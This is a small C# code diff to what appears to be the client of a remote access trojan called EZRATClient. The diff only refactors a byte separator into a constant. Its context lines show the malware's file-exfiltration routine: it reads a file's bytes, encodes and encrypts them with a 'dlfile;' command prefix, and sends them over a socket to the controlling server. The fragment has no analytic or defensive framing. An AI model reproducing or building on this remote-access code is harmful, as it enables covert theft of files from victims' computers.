@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Runtime.InteropServices;
+using EZRATClient.Utils;
 
 namespace EZRATClient
 {
@@ -43,7 +44,7 @@ namespace EZRATClient
             {
                 //_clientSocket.SendFile(path); //Send the data to the server
                 string dataFile = string.Empty;
-                File.ReadAllBytes(path).ToList().ForEach( (b) => { dataFile += b.ToString() + "|"; });
+                File.ReadAllBytes(path).ToList().ForEach( (b) => { dataFile += b.ToString() + Constantes.Separator; });
                 byte[] result = Encoding.Default.GetBytes(Program.Encrypt("dlfile;" + dataFile));
                 Program._clientSocket.Send(result);
             }
